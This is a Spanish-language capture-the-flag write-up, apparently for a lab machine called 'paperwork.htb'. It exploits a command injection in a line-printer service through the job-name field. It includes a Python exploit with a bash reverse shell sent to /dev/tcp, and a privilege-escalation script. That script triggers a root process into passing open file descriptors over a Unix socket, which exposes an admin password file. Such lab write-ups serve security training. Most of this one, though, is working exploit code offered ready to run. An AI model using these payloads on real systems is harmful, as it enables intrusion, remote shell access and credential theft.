El [RFC 1179](https://datatracker.ietf.org/doc/html/rfc1179) muestra como interactuar con el protocolo. El código indica que se le pueden enviar comandos como `2`, `3` o `4`. El RFC indica que *All commands begin with a single octet code, which is a binary number which represents the requested function.  The code is immediately followed by the ASCII name of the printer queue name on which the function is to be performed.*.

No hace falta enviar el nombre de la cola de impresión, el código ya acepta el comando si envíamos solo el código del octeto que representa la función solicitada. Tal como indica el código recibimos la respuesta del servicio a la función solicitada.

```bash
printf '\x03' | nc paperwork.htb 1515
```

```plaintext
Archive_Printer is ready and printing.
```

El script que levanta el servidor tiene una vulnerabilidad que permite ejecutar comandos. Recibe un trabajo de impresión enviado por el cliente. Dentro del archivo de control busca una línea que empiece con `J`, todo lo que venga después de `J` se guarda en la variable `job_name`, esa variable se puede controlar y se inserta directamente en un comando del sistema `f"echo 'Archive: {job_name}' >> /tmp/archive.log"` y se ejecuta con `shell=True`.

```python
job_name = "Unknown"
```

## Exploitation

Para obtener una reverse shell aprovechando la ejecución de comandos creamos un script en Python

```python
import argparse
import socket

parser = argparse.ArgumentParser()
parser.add_argument("lhost", help="Attacker IP")
parser.add_argument("lport", type=int, help="Attacker port")
args = parser.parse_args()

s = socket.create_connection(("paperwork.htb", 1515))

s.sendall(b"\x02archive\n")
print("queue:", s.recv(1))

payload = (f"J';bash -c 'bash -i >& /dev/tcp/{args.lhost}/{args.lport} 0>&1';#\n").encode()

header = b"\x02" + str(len(payload)).encode() + b" cfA001\n"

s.sendall(header)
print("header:", s.recv(1))

s.sendall(payload)

s.sendall(b"\x00")

s.settimeout(2)
try:
    while True:
        print("recv:", s.recv(1024))
except socket.timeout:
    print("timeout")
```

```python
#!/usr/bin/python3
import socket, os, array, hashlib
import zipfile
import shutil

try:
    admin_fd = os.open("/etc/paperwork/admin_pins.conf", os.O_RDONLY)
except Exception:
    os._exit(1)

LOG_PATH = "/home/archivist/printer/logs/commands.log"

def get_admin_secret():
    data = os.pread(admin_fd, 1024, 0).decode().strip()
    if "ADMIN_PASSWORD=" in data:
        return data.split("ADMIN_PASSWORD=")[1].split("\n")[0]
    return data

def scan_for_malice():
    if not os.path.exists(LOG_PATH):
        return False
    with open(LOG_PATH, 'r') as f:
        content = f.read().upper()
        if any(trigger in content for trigger in ["FSQUERY", "FSUPLOAD", "FSDOWNLOAD"]):
            return True
    return False

def trigger_lockdown(conn):
    try:
        log_fd = os.open(LOG_PATH, os.O_RDONLY)
        evidence_bundle = array.array("i", [log_fd, admin_fd])
        msg = b"ALERT: SECURITY_VIOLATION. FORENSIC_CONTEXT_ATTACHED."
        conn.sendmsg([msg], [(socket.SOL_SOCKET, socket.SCM_RIGHTS, evidence_bundle)])

        zip_path = "/root/quarantine/evidence.zip"
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            zipf.write(LOG_PATH, arcname="commands.log")


        with open(LOG_PATH, 'w') as f:
            f.truncate(0)

        os.close(log_fd)
    except:
        pass

def main():
    socket_path = "/run/paperwork/mgmt.sock"
    if os.path.exists(socket_path): os.remove(socket_path)
    if not os.path.exists("/run/paperwork"): os.makedirs("/run/paperwork")

    s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    s.bind(socket_path)
    os.chmod(socket_path, 0o660)
    os.chown(socket_path, 0, 1000) 
    s.listen(5)

    while True:
        conn, _ = s.accept()
        
        if scan_for_malice():
            trigger_lockdown(conn)
        else:
            secret = get_admin_secret()
            token = hashlib.sha256(f"SYSTEM_CLEAN:{secret}".encode()).hexdigest()
            conn.sendall(f"STATUS: SYSTEM_CLEAN\nSIGNATURE: {token}\n".encode())
            
        conn.close()

if __name__ == "__main__":
    main()
```

`scan_for_malice` retorna `True` si el log contiene alguno de los comandos `FSQUERY`, `FSUPLOAD`, `FSDOWNLOAD`. Lo que hace después es enviar dos file descriptors abiertos por root.

Escribimos un script para conectarlos al socket y leer los file descriptors.

```python
os.system("echo FSUPLOAD >> /home/archivist/printer/logs/commands.log")

s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect("/run/paperwork/mgmt.sock")

_, ancdata, _, _ = s.recvmsg(4096, socket.CMSG_SPACE(8))

fds = array.array("i")
fds.frombytes(ancdata[0][2])

print(os.pread(fds[1], 4096, 0).decode())
```
